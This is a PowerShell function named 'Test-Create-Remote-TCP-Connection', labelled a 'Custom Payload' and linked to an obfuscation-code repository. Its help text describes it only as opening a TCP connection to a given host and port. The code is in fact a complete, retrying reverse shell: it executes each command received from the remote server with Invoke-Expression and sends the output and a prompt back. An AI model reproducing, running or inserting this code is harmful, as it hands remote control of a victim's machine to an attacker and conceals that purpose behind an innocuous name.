function Test-Create-Remote-TCP-Connection {
<#
.SYNOPSIS
Custom Payload to create a remote TCP connection with a given URL and PORT.

.DESCRIPTION
This payload creates a remote TCP connection with a given URL and PORT.

.PARAMETER URL
The URL parameter defines the server location.

.PARAMETER PORT
The PORT parameter defines the server port to connect.

.PARAMETER RETRY_INTERVAL
The RETRY_INTERVAL parameter defines retry time period to connect.

.PARAMETER RETRY_COUNT
The RETRY_COUNT parameter defines number of time to try connections.

.EXAMPLE
PS > Test-Create-Remote-TCP-Connection '192.168.43.196' 
RETRY_INTERVAL
.LINK
https://github.com/FabianConP/ObfuscationCode
#>

    [CmdletBinding()] Param(
        [Parameter(Position = 0, Mandatory = $True)]
        [String]
        $URL,

        [Parameter(Position = 1, Mandatory = $True)]
        [Int]
        $PORT,

        [Parameter(Position = 2, Mandatory = $False)]
        [Int]
        # By default retry every 10 seconds
        $RETRY_INTERVAL = 10,

        [Parameter(Position = 3, Mandatory = $False)]
        [Int]
        # By default try at least 10 times
        $RETRY_COUNT = 10
    )

    # Try to connect to server every $RETRY_INTERVAL, $RETRY_COUNT times.
    do{
        try {
            $client = New-Object System.Net.Sockets.TCPClient($URL, $PORT);
            $stream = $client.GetStream();
            [byte[]]$bytes = 0..65535| ForEach-Object {0};
            while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
                $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i);
                $sendback = (iex $data | Out-String );
                $sendback2  = $sendback + "PS " + (pwd).Path + "> ";
                $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
                $stream.Write($sendbyte,0,$sendbyte.Length);
                $stream.Flush();
            }
            $client.Close();    
        } catch {
            Write-Host "$_.Exception.Message`nRemaining tries: $RETRY_COUNT. Retrying in $RETRY_INTERVAL seconds."
            Start-Sleep -s $RETRY_INTERVAL
        }
    } while($RETRY_COUNT--)
}